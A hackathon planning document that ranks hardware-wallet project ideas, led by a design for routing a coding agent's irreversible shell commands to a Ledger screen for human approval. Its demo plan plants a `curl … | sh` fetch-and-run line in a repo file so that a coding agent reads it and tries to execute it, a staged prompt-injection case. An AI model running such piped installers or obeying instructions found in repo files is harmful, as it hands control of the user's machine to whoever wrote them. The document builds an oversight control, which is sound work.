# IDEAS.md: what to build for N3XT @ OP3N 2026

Written 2026-10-10 (Saturday) from the 16 judged candidates, the brief (`HACKATHON.md`), the worklog and the notes in `research/`. Deadline is Tuesday Oct 13 23:59 CEST; Sunday Oct 11 has no Ledger mentors, Monday Oct 12 and Tuesday Oct 13 do. (Calendar corrected after the second-opinion review in section 7; the day-by-day plans below were written against the wrong weekday and have been relabelled.) Neither Ledger has ever been plugged into the build host (`spikes/host-capabilities`), so every plan below starts with hardware truth on Day 1.

Scores are the rubric-weighted totals from the judging pass (Technical 25, Ledger relevance 20, Innovation 20, UX 15, New use cases 10, Clarity 10). "Refuted" means the feasibility or originality reviewer found the plan as written does not hold; in most cases the reviewer also wrote a fix, and the ranking below is on the fixed version.

## 1. TL;DR

**Build I11, ledger-sudo, cut to its core.** A local daemon owns the Ledger over DMK node-hid and a Claude Code PreToolUse hook sends every irreversible shell command to the Secure Screen as EIP-191 text before it runs. The agent runs reads, builds and tests alone; `git push`, deploys, package publishes and secret reads block until a human reads the literal command and cwd on the device and presses. Every tool call is hash-chained into a session log the human signs off at the end. It uses the one signing path that is proven on this host today (`spikes/speculos-dmk-sign` run12: signMessage on both nanos2 and flex Speculos with address recovery matching; `research/gap-clear-signing-without-origin-token.md`: no CAL, no originToken, no blind-signing toggle). It is non-finance, which the brief says is where the unseen projects are, it lands in the ~9 of ~70 prior entries that were not about money, and it turns Rogers' own lines (stakes-scaled permissions, "don't give them secrets", audit trail) into a product he would run himself. Originality survived review: nobody has put the command text on the device, and the prior art (ClawApprove, CoSig, Preflight MCP, Tollgate) either has no screen or only gates money. The feasibility reviewer refuted the full plan on scope (eight subsystems), so the build is the core only: daemon, hook, tier classifier, EIP-191 line, hash chain, verifier, demo repo with a planted `curl | sh`. Flex is the hero device; the Nano S Plus is the second signer for the two-person tier and nothing else on stage.

**Alternative with a non-developer user: I14, Consent Receipts.** Three fake FHIR records are encrypted at rest; when a pharmacy bot asks for "the full record", the broker narrows it by purpose and the Flex shows "RELEASE allergies, medications TO PharmaBot, refill". One press releases exactly those fields and produces a receipt anyone can verify offline with `viem.verifyMessage`; an insurer-agent asking for psychiatric history gets a signed DENY on the Nano S Plus with nothing decrypted. Both reviewers passed it: same EIP-191 primitive as I11, so the same Day-1 risk profile, nothing on-chain, no funds, no partner token. Medical and legal records are absent from every prior Ledger entry, and the signed refusal is a beat no project has shown. Weaker than I11 on technical depth (the broker holds the decrypt key, so the device attests consent rather than enforcing release, and the pitch has to say so). Pick this over I11 if the pitchers would rather tell a story about a patient than about a developer, or if Mathias' "a product any person adopts" matters more to the team than Mo's tool-loop craft.

**High-ceiling upgrade on the same host: I06, Receipt.** A custom Rust app (fork of `app-boilerplate-rust`, sideloaded on both devices without approval) renders an agent's action as structured NBGL fields and signs a receipt bound to a monotonic counter kept in the Secure Element's NVM. Delete one approval from the host log and the verifier prints "GAP at #43, device counter is 44": the host lied, the chip caught it. Technical score 79, the highest of any shippable candidate, and the only one of the top group that puts new code on the Secure Element. It is refuted on feasibility because API_LEVEL match, the Rust NVM storage API and ledgerblue on Windows are all unverified and the mentors are off until Monday. Its fallback is literally I11's path (same receipt text via the stock Ethereum app's EIP-191, host-side counter), so the honest way to run it is: build I11 first, then spend Sunday on the sideload gate; if the unmodified boilerplate installs on the Flex by Sunday noon, the receipts move into the chip and the project gets its counter demo. If not, nothing was lost.

Rejected as the headline despite high paper scores: I03 Flex as the Card (78.65) needs an NFC Android phone, a Kotlin author, the C toolchain in Docker on a host with 0 to 4 GB free, and an undocumented BOLOS NFC routing path, over a mentor-less Sunday. I10 ringctl (75.0) has the best Ledger relevance in the set but its climax (removeMember on app 17 with a device tap, on production) is the one thing nobody has tested, and the Key Ring on native Windows needs Ledger Sync activation, trustchain network and Credential Manager before any product code. Both are in the deep dive as serious options for a team with the right person on it.

## 2. Honest verdicts on the two starter ideas

### Voice agent with face scan to authorise, Ledger signs

What is impossible or self-defeating:

- Face as the authority. The build host has no Windows Hello IR camera (`spikes/host-capabilities`: `AvailableFactors = 0`, `WbioSrvc` stopped), so any WebAuthn "face gate" prompts for the Hello PIN. Pitching it as face would be a lie on this laptop.
- Face as the authority with this jury. `research/gap-proof-of-human-biometrics-stance.md`: Rogers defines Proof of Human as genuine check plus Secure Screen approval ("a physical human holding a specific device"); Ledger Academy calls biometric logins software that deepfakes can fool; the brief says "in hardware rather than in software that can be rewritten remotely". A camera-gated flow argues against the people scoring it.
- "Nobody has done voice + Ledger". ITHACA took 3rd in ETHOnline 2026's Ledger track with Gemini Live voice, a Flex over DMK, and a cosmetic "Face ID" animation whose WebAuthn result is discarded (`research/gap-ithaca-voice-ledger-prior-art.md`). Rogers and Mathias judged that track. Any voice pitch gets "we saw ITHACA" in the first thirty seconds unless it names ITHACA and shows the inversion.
- "Local whisper.cpp already on this host". It is not; the TypeWhisper directory is gone and `faster-whisper` is not installed (model `small.en` is cached, so it is one `pip install` away). Web Speech in Chrome 153 is the zero-install path.

What survives: voice as the drafting channel. The spoken sentence becomes a transaction or a text that the device renders, and the human authorises by reading the Secure Screen, per utterance, with no standing mandate and no hot key. ITHACA did the opposite on every axis (one 168-hour EIP-712 mandate, raw caps, `AGENT_PRIVATE_KEY` in env, the spoken command never reaches the device), which is the differentiation.

Strongest reframe: I01 Echo, "what you hear is what you sign". One utterance, one clear-signed tUSDC transfer on Base Sepolia (or native ETH as the committed fallback), and a `deviceText(tx)` function that formats amount, ticker and recipient from the serialized bytes, not from the LLM, and feeds only that to TTS. The demo catch is a teammate saying "seventy", the device showing 70, and the presenter rejecting. Both reviewers passed it (67.7 weighted). It stays below the top three because its Ledger primitive is the most common one in the field (a clear-signed ERC-20 transfer) and the "clear signing with a microphone" objection is real. The accessibility angle (blind user hears the Secure Screen fields; banks ship this as OneSpan Digipass Comfort Voice; crypto hardware wallets do not) is the product ask to make to Mathias. If the team wants voice without the saturated money rail, bolt voice onto I14 as the way a patient dictates a release, or onto I11 as the way the operator approves out loud; in both the device, not the mic, is the authority. Face at most selects whose contact book or policy loads, and even that is a slide, not a build.

### Ledger-to-Ledger NFC payments by tapping devices

What is impossible (`research/device-capabilities-nfc-ble.md`, `research/custom-device-apps-bolos-speculos.md` §6):

- The Nano S Plus has no NFC radio, no Bluetooth and no battery. One of the two devices cannot take part in any wireless link.
- No host SDK exposes an NFC transport. DMK, ledgerjs and wallet-cli have USB, HID, WebUSB, BLE and Speculos transports. Nothing talks NFC to a Ledger today except a phone's FIDO stack (Security Key app) and the Recovery Key card.
- Flex to Flex would need two Flex units, a custom C app built with `ENABLE_NFC` on one side and the undocumented `ENABLE_NFC_READER` on the other, and a protocol of your own. The lib_nfc doc says "TO BE COMPLETED". Research-grade, not hackathon-grade.

What survives: one real NFC tap with the Flex as the card and a phone as the reader. Two forms exist:

- Stock app, zero firmware: the Security Key app (FIDO2) answers a WebAuthn assertion over NFC from an iPhone or an Android 14+ phone, and the Flex shows the RP and user on its E Ink. Verified only for iPhone plus webauthn.io (`research/hardware-security-fido-pgp-ssh.md`). This is I02 (the payee taps to attest their receive address, the payer signs USDC on the Nano S Plus) and I08 (tap your Flex on your phone to approve a remote agent).
- Custom C app with `ENABLE_NFC=1`: the phone taps the Flex, the Flex hashes an EIP-3009 USDC authorization on-chip, shows "Pay 0.50 USDC to Café, Arc Testnet, expires 14:05", and signs over NFC. This is I03, the truest reading of "tap your Ledger to pay", and the first third-party app to drive lib_nfc if it works. Whether BOLOS routes NFC APDUs to a third-party app at all is an open question with a four-hour Day-1 probe.

Strongest reframe: I02 Tap to Receive, because it inverts who taps. Every poisoned-invoice demo in the corpus (five or more) defends on the payer's screen; nobody has had the receiver's hardware vouch for the address before the payer signs, and zero of ~70 prior projects touch Ledger NFC. Its feasibility review found the settlement path as written contradicts itself (Circle's keyless /settle needs a seller proof signed by the payTo key after the payer's signature exists, so the Flex would have to sign twice) and that the Web BLE fallback is riskier than the primary; the fix is a Circle developer account with Bearer auth, Flex-over-USB FIDO as the fallback, and a stable tunnel hostname as the RP ID from hour one. Only attempt it if someone on the team owns an iPhone or a current Android 14+ phone. If a club member owns an NFC Android and writes Kotlin, I03 is the bigger swing, with I02 as the committed fallback.

## 3. Ranked table

Rank is the synthesis order (score, verdicts, and fit with this team and calendar), not the raw score.

| # | id | Title | Weighted | Feasibility | Originality | Note |
|---|----|-------|---------:|-------------|-------------|------|
| 1 | I11 | ledger-sudo: hardware sudo for coding agents | 75.7 | refuted (scope); core survives | passes (0.6) | Build the core only: daemon, hook, EIP-191 command line, hash chain, verifier. Flex hero, Nano as second signer. |
| 2 | I14 | Consent Receipts: field-level record release | 71.9 | passes (0.7) | passes (0.72) | Same primitive, lowest risk, non-crypto user story, signed refusals are new. Say "device attests, broker enforces". |
| 3 | I06 | Receipt: SE approval receipts with an NVM counter | 74.2 | refuted (API_LEVEL, NVM API, scope) | passes (0.6) | Highest technical ceiling. Gate: unmodified Rust boilerplate sideloads on the Flex by Sunday noon. Fallback is I11's path. |
| 4 | I10 | ringctl: the Key Ring lifecycle Ledger forgot | 75.0 | refuted (scope; removeMember untested) | passes (0.6) | Best Ledger relevance (88). Cut to members / admit / evict --reencrypt / backup / offline. Needs Ledger Sync and trustchain network. |
| 5 | I01 | Echo: what you hear is what you sign | 67.7 | passes (0.7) | passes (0.72) | The honest starter idea 1. Fine build, common primitive. Lead with the "seventy" catch and the ITHACA inversion table. |
| 6 | I08 | Pocket Approval: tap Flex on phone to approve an agent | 72.8 | passes (0.6) | refuted (CoSig, YubiKey 5.8) | Only the NFC-to-E-Ink tap, the seed-portable credential and the EIP-191 escalation tier are unseen. Needs a phone. |
| 7 | I05 | Lease: lend your presence to an agent, revoke with a press | 73.8 | refuted (GitHub Pages registry, shared seed, scope) | refuted (RingTree, Signel, Rogers' Feb repo) | Survives only as "proof of presence for non-money actions, verifiable by strangers", ReCap grammar, one local relying party. |
| 8 | I15 | Minute Book: officers countersign the AI secretary | 67.0 | passes (0.65) | passes (0.7) | Clean, low-risk, two devices on camera, non-finance. Thin Ledger primitive; restage the poisoned-tally beat. |
| 9 | I03 | Flex as the Card: custom NFC payment app | 78.65 | refuted (NFC routing unverified, phone, toolchain, RAM) | passes (0.7) | Highest ceiling in the set. Only with an NFC Android owner who writes Kotlin, and only alongside I02 as fallback. |
| 10 | I09 | Tap-Minted Secrets: hmac-secret keys between tap and tab close | 69.8 | refuted (hmac-secret on Windows unproven on every path) | passes (0.7) | Action-bound salt and ephemeral purse key are new. Go/no-go is raw CTAP as admin; OpenPGP pivot is Ledger's own feature. |
| 11 | I02 | Tap to Receive: payee's Flex binds the address | 68.9 | refuted (seller proof, BLE fallback, tunnel RP ID) | passes (0.72) | The honest starter idea 2. Fixable with Circle Bearer auth and USB FIDO fallback. Needs an iPhone or Android 14+. |
| 12 | I13 | Five-Minute Mind: hardware-timeboxed cognition | 68.8 | refuted (wallet-cli has no Base reads; SIWE replay unverified; mainnet money) | passes (0.6) | Run the free replay test first. If Venice rejects reuse the project collapses into a wallet copilot. |
| 13 | I12 | Agent Rules: policies in front of Agent Intent | 68.7 | refuted (two-step eviction, mainnet funds, three enrolments on a weekend) | refuted (Harbormaster + Rogers' Feb repo) | First on a 5-day-old rail is adoption, not invention. OP3N may unveil Agent Policies the day before finals. |
| 14 | I04 | Allowance Cheques: EIP-3009 validity windows as policy | 67.1 | refuted (cancel is per-nonce; Circle /verify untested; scope) | passes (0.72) | Elegant reframe, raw EIP-712 screens, policy stops once a cheque is cashed. One primitive, one day, if at all. |
| 15 | I07 | Leash: silent inside the cap, Ledger outside it | 67.6 | refuted (zero hardware contact, Circle Agent Wallet unverified, SE stretch) | refuted (xPayables is this project) | Only the "purse is the chip" SE version is unseen, and it is the hardest build here. |
| 16 | I16 | Injection Range: eval harness with a Ledger exit | 67.0 | refuted (six subsystems, LLM-judge metric, Venice cost) | refuted (AgentDojo, Mind the GAP) | Reusable idea inside it: per-device Secure Screen readability of hijacked calls as a DX finding. |

## 4. Deep dive on the top five

### I11 ledger-sudo (rank 1)

Primitives: DMK 1.11.0 with `device-transport-kit-node-hid` 1.0.1 and `signer-kit-ethereum` 1.18.1 on Node 24 (install and load verified without a compiler in `spikes/node-hid-windows`); `signerEth.signMessage` (EIP-191) on both devices; `getAddress` with `checkOnDevice` to enrol the approver; `ethers.verifyMessage` offline. Key Ring token release and Security Key `ed25519-sk` commit signing are in the original candidate and are cut from the build (roadmap slide and a two-hour video-only timebox respectively).

Boundary in one sentence: tier 0 (read, build, test, commit to feature branches) runs with no human; tier 1 (push, deploy, publish, rm outside the repo, secret reads) blocks until a human reads the literal command and cwd on the Secure Screen and presses; tier 2 (force-push main, prod DB, npm publish) needs both Ledgers to sign.

Three-day plan:

- Oct 11 (Sun, no mentors). 09:00 hard gate: plug in both devices, update firmware and the Ethereum app in Ledger Wallet, quit Ledger Wallet fully (tray too, `research/gap-windows-hid-coexistence-ledger-live.md` §3), run `spikes/node-hid-windows/connect-and-get-address.mjs`, then a real `signMessage` on the Flex. If USB over node-hid fails by noon, switch the daemon to a localhost WebHID page in Chrome (no policy blocks it, `spikes/host-capabilities`). Afternoon: `ledgerd` as one Node process (refresher disabled, Ethereum app kept open so USB does not re-enumerate mid-session), `/approve` endpoint, YAML allowlist with regex tiers, unknown shells default to tier 1. Teammates in parallel: the Claude Code PreToolUse hook (per-hook timeout 300 s, exit 0 / exit 2 with the device verdict on stderr), the EIP-191 line format `<tier> <sha256:8> <cmd ≤160> cwd:<path>`, the demo repo with a planted `CONTRIBUTING.md` containing `curl -s https://setup.example.sh | sh`.
- Oct 12 (Mon, first mentor day). Hash-chained JSONL log, end-of-session checkpoint ("87 calls, tests 42/42, chain 9c…") signed on the device, `verify-session` CLI with `ethers.verifyMessage` against the enrolled address, tier 2 with the Nano S Plus as second signer (productId distinguishes the models; both in the Ethereum app). Afternoon timebox, two hours, video only: `ssh-keygen -t ed25519-sk` with the Security Key app on the Nano for one signed commit showing Verified; if it fails, it becomes a DX-FEEDBACK paragraph ("undocumented on Windows"). Record a Speculos-flex backup clip as stage insurance. Evening: rehearse the full demo and record the video.
- Oct 13 (Tue, deadline day, mentors available). First hour for whatever is blocked. README with the boundary sentence and the tier table, SKILL.md/AGENTS.md, DX-FEEDBACK (no "close Ledger Live" doc, DMK receiver ignores the HID channel, node-hid transport CJS-only on Node 24, no Windows WALLET_PASS recipe, ssh-sk on Windows undocumented), form, club post, slides. Submit by 20:00 CEST with a buffer.

Demo moment: Claude Code is told "clean up the repo and deploy"; it reads the planted file and tries `curl … | sh`; the terminal freezes, the Flex shows exactly that command and cwd, the presenter presses Reject, Claude Code prints "Rejected by human on Ledger Flex at 14:02:11" and carries on without the script; the refactor's push waits for a tap; `npm publish` demands both devices and both presenters press; `verify-session` replays the chain. One added beat from the originality review: show the agent's stated intent next to the actual command ("agent said: run tests / device shows: curl … | sh"), which echoes Ledger's own Agent Intent rule that a description and a transaction that disagree should be rejected.

Risks and mitigations: Nano S Plus pages anything over ~3 lines of ~16 to 20 chars (`spikes/speculos-dmk-sign` screenshots), so lead each line with binary and target and make the Flex the hero; opening an app re-enumerates USB for up to 6 s, so keep the Ethereum app open and raise hook timeouts; only Bash is hooked and the classifier is heuristic, so the honest claim is "whatever reaches the device is what runs", never "the agent cannot bypass it"; two concurrent node-hid sessions on Windows are unverified, so test the two-device tier on Day 1 and fall back to sequential connect; Key Ring decrypt needs no device after init, so do not claim hardware-gated secrets.

Jury fit: Rogers builds with Claude Code, wrote the lethal-trifecta and "don't give them secrets" lines, and asks for audit trails unprompted. Mathias gets "a stop point the agent cannot reason around" with one glance and one press, and revocation as a policy edit or an unplugged cable. Mo gets hooks, a tool loop, and a blunt Windows DX doc. Breeding has little; one gated `x402 pay` row in the tier table and a sentence, not a build.

Closest prior project and the difference: ClawApprove (a Claude Code PreToolUse hook that routes risky calls to a phone approver) has no signature and no trusted screen; CoSig (WebAuthn tap before an MCP tool runs) uses a YubiKey, which has no screen, so the human taps blind; Preflight MCP (2nd, ETHOnline 2026) and Tollgate gate money, not commands. ledger-sudo is the only one where the literal command text is what the human reads and signs. Name all four on a slide before a juror does.

### I14 Consent Receipts (rank 2)

Primitives: `signerEth.signMessage` (EIP-191) over DMK WebHID in Chrome; `viem.verifyMessage`; AES-256-GCM at rest in Node (Key Ring `ring encrypt --key records` only if `ring init` works natively within a two-hour timebox, else say "Key Ring is the optional backend" in the README).

Boundary in one sentence: the agent parses the request, maps it to fields, narrows by purpose and drafts the release line; every release and every refusal is a device signature by the record owner, and nothing is decrypted without a signature matching the owner's address.

Three-day plan:

- Oct 11. Hardware only, in order: plug each device, update firmware and Ethereum app, install the Ledger Sync app from My Ledger (only if attempting Key Ring), quit Ledger Wallet, run the signMessage plus verifyMessage loop on both devices in Chrome via WebHID (the Speculos spike script is the template). Decide the owner identity: both devices restored from one seed, or whitelist both addresses in the broker. Timebox `wallet-cli ring init` natively with `WALLET_PASS` set in PowerShell (`spikes/wallet-cli-windows` verified the no-device commands; device enumeration is untested). Teammates: three fake FHIR JSON records, the keyword-to-field request map (no LLM needed), the release-line grammar kept under ~90 characters so the Nano shows it in two or three pages.
- Oct 12. Broker pipeline: request → fields → release text → wait for signature → decrypt → redact → deliver, plus receipt `{message, signature, owner}`; the owner UI has Release and Deny buttons so the device signs whichever line was chosen (a plain device Reject returns an error, not a signature, and is logged as "no receipt"; the pitch must say this); receipts page with a verify button; a requester-agent script as the counterparty. Record the full video with both devices on Day 2 night.
- Oct 13. README with a prior-art section (SoulVault, NextKey, Openterms, the Ledger N3XT medical-credentials paper), Kantara/ISO 27560-shaped receipt fields, DX-FEEDBACK (Key Ring "derived from seed" marketing versus a server-held root, no header on ciphertext, no Windows WALLET_PASS recipe), form, post, slides. Voice input only if the video is already cut.

Demo moment: open with the DENY. An insurer-agent asks for psychiatric history; the Nano S Plus shows "DENY psychiatric_history TO insurer-agent"; the presenter signs the refusal and the log shows a receipt with nothing decrypted. Then the pharmacy bot asks for the full record, the broker narrows it to allergies and medications for purpose "refill", the Flex shows exactly that line, one press, two fields go out, a receipt lands, and the verify page recomputes the signature.

Risks and mitigations: the trust model is weak and must be stated ("the device attests consent; the broker enforces release"; a compromised broker decrypts without the device), and the highest-leverage change if time allows is to make the device signature the thing that unlocks the decrypt key rather than a check the broker performs; `ring decrypt` needs the trustchain backend and Credential Manager on every call, so Paris Wi-Fi becomes a dependency unless the records are encrypted locally; the ~80-character line paginates on the Nano; the term "consent receipt" collides with a Kantara standard and the Openterms MCP, so align with the standard and contrast with it ("their receipt proves the agent decided; ours proves the human did, on a screen software cannot rewrite").

Jury fit: Rogers gets hardware consent for identity-adjacent data with an audit trail and no biometrics; Mathias gets a non-crypto user story with one press and a new device category (a consent device); Mo gets privacy used for a stated reason; Breeding is low and the README says plainly that no USDC moves.

Closest prior project and the difference: SoulVault (1st, "Extend to Ledger", ETHOnline 2026) did wallet-authorised selective disclosure of redacted documents, with agent-memory continuity as the pitch; it never put the field list on the Secure Screen, had no purpose narrowing, no signed refusals, and no medical or legal framing.

### I06 Receipt (rank 3)

Primitives: `app-boilerplate-rust` fork built with `cargo ledger build flex` (and `nanosplus` only if it installs first try) inside the `ledger-app-dev-tools` Docker image; `ledgerblue.runScript --scp` from the host venv (`spikes/ledgerblue-and-app-toolchain`: wheels install, HID backend loads, `sideload.ps1` ready); two instructions, Attest (TLV fields plus action hash, NBGL tag/value review, deterministic signature over `sha256(counter || policy_hash || action_hash)` under a non-wallet path) and GetCounter; the counter in NVM via `ledger_device_sdk::nvm::AtomicStorage<u32>` with a RAM counter as the two-hour fallback; host is a ~60-line script on raw node-hid or Python ledgercomm, not DMK (DMK's session refresher polls GetAppAndVersion every second and a custom app's answer is unverified).

Boundary in one sentence: the agent drafts and executes anything without a side effect outside its sandbox on its own; any irreversible action is sent to the device as structured fields and happens only after a Secure Screen tap, and the host cannot forge, replay or silently drop an approval because the counter lives in the Secure Element.

Three-day plan:

- Oct 10 (tonight). Update both device OSes in Ledger Wallet and note the versions; post the API_LEVEL question in the hackathon Discord now so it is answered Monday; pull the dev-tools image; build and run the unmodified boilerplate in Speculos, headless, one Docker process at a time, in the foreground (the host reaper kills background shells under memory pressure).
- Oct 11, by 12:00. Sideload the unmodified boilerplate on the Flex. If `0x511F` (API_LEVEL mismatch) or ledgerblue on Windows fails, spend at most two hours on a pinned SDK tag or a teammate's Linux laptop, then freeze: Speculos becomes the device for the video and the real Flex demos the same receipt text via the stock Ethereum app's EIP-191 with a host-side counter, stated plainly. Afternoon: Attest with the fields Agent / Action / Target / Policy / Receipt #, every value under ~12 chars so Nano paging never matters; two Ragger tests (approve, reject 0x6985) on Speculos flex.
- Oct 12. NVM counter verified across a power cycle on real hardware (cap two hours, then RAM counter and say so); host `approve` wrapper that refuses to run the command without a receipt and appends JSONL; `verify.py` loop checking counter continuity and signatures; install the final binary and never reinstall it before the video (re-sideloading wipes app NVM); hard stop on code 18:00, record the video.
- Oct 13. README with the threat model and a "what the Ethereum app cannot do" table, the vs-CoSig / vs-WebAuthn-signCount / vs-EIP-191 comparison, DX-FEEDBACK (docs.rs fails for `ledger_device_sdk`, three spellings of nanosplus, Windows load from host only), form, post.

Demo moment: the agent says "deploying api v2.4 to prod"; the Flex shows "Agent: deploy-bot · Action: DEPLOY · Target: prod/api · Policy: a3f9… · Receipt #0042"; tap, the deploy runs, the verifier prints "chain valid, 42 receipts"; the presenter deletes one approval from the host log and re-runs: "GAP at #0043, device counter is 44, log has 43". The host lied and a two-euro chip caught it. Nano S Plus as a ten-second "same binary installs on the $79 device" clip only if it installs first try.

Risks and mitigations: everything hinges on the Sunday-noon sideload gate, with no mentor until Monday; the Rust storage API is verified only by Cargo feature names; the "just a YubiKey touch" objection is answered by binding the signature to the rendered fields (FIDO signCount counts, it never shows the action) and by naming CoSig first; a sideloaded app fails the Genuine Check, so present it as a prototype of the Q3 Agent Policies and attestation line, not a shippable app.

Jury fit: Rogers gets the audit trail he raises unprompted and an "irreversible equals device" boundary; Mathias gets a stop point the agent cannot reason around, prototyped on the roadmap item that has not shipped; Mo gets Rust on the SE, Speculos CI and clippy-clean code; Breeding has nothing unless one action is "approve a USDC payout", which the feasibility reviewer says to drop.

Closest prior project and the difference: CoSig (hardware key tap plus per-signature counter plus hash-chained log before an MCP tool runs) signs an opaque WebAuthn challenge; the human never sees the action on secure hardware. Vela (ETHOnline 2026) is the only prior Ledger app with SE-side state, storing Hedera mandates to avoid taps; Receipt stores a counter to make every tap attributable and undroppable. Nobody has shipped a custom BOLOS app on a Nano S Plus.

### I10 ringctl (rank 4)

Primitives: `@ledgerhq/ledger-key-ring-protocol` 1.0.0 (`sdk.getMembers`, `addMember`, `removeMember`; removing a member closes `m/0'/17'/N'` and opens `N+1'`), wallet-cli 2.9.0's own member credential read from Windows Credential Manager (PBKDF2-SHA256 600k, AES-256-GCM), wallet-cli-compatible ciphertext (HKDF-SHA256 with salt `wallet-cli-domain-v1`, `[12-byte IV][ct||tag]`) so `rotate --reencrypt` can re-seal every file, a Chrome WebHID relay page for every device operation (the Harness pattern, proven on production), `StreamTree.deserialize` for offline decrypt from a saved tree.

Boundary in one sentence: any enrolled machine decrypts autonomously with its member key, password and network; only a human with the Ledger admits a host, evicts one or rotates, each a tap in the Ledger Sync app; "Ledger guards membership, not ciphertext".

Three-day plan (the feasibility fix): Day 1 go/no-go in order, stop at the first failure: native `ring init` on Windows with Ledger Wallet quit and the Credential Manager entry unwrapped; the protocol package loads (CJS via `createRequire`, or vendor StreamTree/SoftwareDevice/NobleCrypto); `getMembers`; then `removeMember` on app 17 with a device tap, the demo primitive, tested before `addMember`. If eviction is not green by end of Day 1, all logic runs under `WALLET_CLI_MOCK=1` plus one recorded real-device enrol clip. Day 2: `members`, `admit` through the relay page only (no software add-member verb, so the boundary sentence stays true), `evict --reencrypt` with atomic 0600 writes, `backup`, `decrypt --offline`, one assert-based round-trip script as the entire test suite. Day 3: README, one-page Windows runbook, DX-FEEDBACK (docs say WSL while shipping a Windows binary, no WALLET_PASS recipe, the docs sentence about Sync-member rotation is wrong per code, no ciphertext header, addMember undocumented, one-year purge semantics unknown), video, form, post. Cut: age-plugin-ring, sops, the Scheduled Task/DPAPI agent, the GitHub Actions live admit, the Arc USDC mover.

Demo moment: a USB-less Docker container decrypts `.env.enc` every two seconds; `ringctl members` shows laptop plus container; `ringctl evict container --reencrypt`, the Nano S Plus asks for confirmation, one press, the container's next decrypt prints `TrustchainEjected` while the laptop's files still open; pull the network cable and `ringctl decrypt --offline ring.bak` still works.

Risks and mitigations: one ring means one seed, so the two-device staging only works if both devices share a seed (otherwise Nano only); `hw-transport-node-hid` pins a node-hid version the research says to avoid, hence the browser relay for everything; the protocol package's ESM build has extensionless imports (two hours budgeted); wallet-cli releases often, so diff the CHANGELOG on Day 1 and again before submission in case Ledger ships `ring members`.

Jury fit: Rogers' SXSW problem #3 (scope, protect, revoke, audit an agent's secrets) with a live revoke; Mathias' "how do you revoke" answered on his own product surface with a PR-shaped deliverable; Mo gets a clean CLI and blunt DevRel feedback; Breeding is weakest (print the agent key's Arc address, nothing more).

Closest prior project and the difference: Harness (1st, ETHOnline 2026) proved a USB-less VM can join the ring via a WebHID relay and `addMember`, inside a product, with no tool and no remove, rotate or backup. Ledger's own dev tool at live.ledger.tools/trustchain lists and removes members but does not re-encrypt or update wallet-cli state. The unseen parts are eviction with re-sealed ciphertext, the ring surviving Ledger's server, and a native-Windows story.

### I01 Echo (rank 5)

Primitives: DMK WebHID in Chrome, `signerEth.signTransaction` of a CAL-listed tUSDC transfer on Base Sepolia (clear-signs without originToken per `research/gap-clear-signing-without-origin-token.md`; on-screen strings inferred, native ETH on Sepolia is the committed fallback), DMK's `requiredUserInteraction` state machine mapped to speech, Web Speech API for STT and TTS (or `faster-whisper small.en`, one pip install), one LLM call with a strict JSON schema for contact and amount.

Boundary in one sentence: the agent alone listens, transcribes, resolves the contact, checks balance and gas, builds the transaction and narrates every device state; the human alone authorises by reading the Secure Screen and tapping, per utterance, with no standing mandate and no hot key anywhere.

Three-day plan: Day 1 hardware truth (quit Ledger Wallet, WebHID connect, `getAddress` on device, Base Sepolia gas plus Circle faucet tUSDC, one real `signTransaction` on each device, photograph both screens; lock to native ETH by end of day if the tUSDC strings disappoint). Day 2 the voice loop, `deviceText(tx)` that formats amount, ticker and recipient from the RLP bytes, the state-to-speech map, a contact JSON, the scripted "seventy" rejection. Day 3 video on both devices, README with the boundary sentence and the four-row ITHACA inversion table, DX-FEEDBACK (hidden context-module peer dep, broken README connect snippet, originToken opacity, `v` normalisation).

Demo moment: "Send Alice twenty tUSDC"; the agent reads back "Sending 20 tUSDC to 0x1234…abcd, check your Ledger"; the Flex shows the same amount, ticker and recipient; a teammate says "seventy", the device shows 70, the presenter says "that is not what I said" and rejects on the device; repeat the happy path on the two-button Nano S Plus, which nobody has demoed with voice.

Risks and mitigations: ERC-20 transfers need Base Sepolia ETH for gas, which the faucet does not give (solve Day 1 or use Sepolia); the exact on-screen rendering is inferred, so say "the same amount, ticker and recipient as the Secure Screen" until verified; `getUserMedia` and WebHID both consume the user gesture, so order them; script the mishear as a deliberate second utterance, never a real STT error; the "clear signing with a microphone" objection is only answered by the catch, so lead with it.

Jury fit: Rogers gets "agents propose, humans approve, hardware enforces" with no camera; Mathias gets a shipped voice UX with no hot key; Mo gets local STT and a DX doc; Breeding gets USDC moving on Base Sepolia.

Closest prior project and the difference: ITHACA (3rd, ETHOnline 2026) signed one 168-hour EIP-712 mandate with raw caps on a hot `AGENT_PRIVATE_KEY`, with a skippable fake Face ID, and the spoken command never reached the device. Echo is per-utterance, has no key anywhere, puts the words on the device, and has no biometrics. Vox (ETHGlobal NYC 2026) plans one transaction per sentence with a hot EOA and no hardware wallet.

## 5. Combinations that stack

- **I11 + I06 (recommended stack).** Same host daemon, same hook, same hash chain. Day 1 ships ledger-sudo on the stock Ethereum app with EIP-191; if the Rust boilerplate sideloads by Sunday noon, tier-1 approvals move into the custom app and gain the SE-anchored counter, and the pitch becomes "the receipt proves what the human read, and the chip proves no approval was dropped". If the sideload gate fails, the project is still complete. I06's own feasibility fix names I11's path as its fallback, so this is one project with two ceilings.
- **I14 + I11.** Identical signing code; the difference is the relying party (a record broker versus a shell hook). A team of four could build both front ends on one `ledgerd` and pick the pitch on Oct 13 based on which demo rehearses better. Do not submit both; one submission per team.
- **I01 voice on top of I14 or I11.** Voice as the drafting channel only: the patient dictates "share my allergies with the pharmacy", the broker builds the release line, the device shows it. This keeps starter idea 1 alive without the saturated money rail, and `deviceText` becomes "speak back the line the device will show".
- **I10 as the secrets layer under I11.** ledger-sudo's "prod tokens released after a signature" was cut because Key Ring decrypt needs no device after init. If ringctl's eviction works, ledger-sudo's agent host can be a ring member that the human evicts with a tap, which is a real revoke story. Only after both cores work; never on the critical path.
- **I02 + I03.** The only sensible way to run I03: I02's Security Key tap on the phone is the committed NFC moment, and I03's custom app is the four-hour Day-1 probe that, if it answers one APDU over NFC, replaces it. Needs an iPhone or Android 14+ for I02 and an NFC Android plus a Kotlin author for I03.
- **I16's readability metric inside any EIP-191 project.** The per-device "could a human spot the divergence in this rendering" table (Nano paging, hex addresses, long lines) is a ten-line script over the lines I11 or I14 already produce, and it is the kind of DX finding Mathias and Mo take home.

Do not stack: I12 or I07 onto anything (both reviewers refuted them and they pull the project back into the intent-queue and cap-and-tap pile the jury built in February); I13's Venice SIWE session with anything that needs mainnet money on Day 1.

## 6. Open questions to settle on hardware on Day 1

Pulled from the research notes' own open-question sections. The first block gates every top pick; the others gate specific candidates.

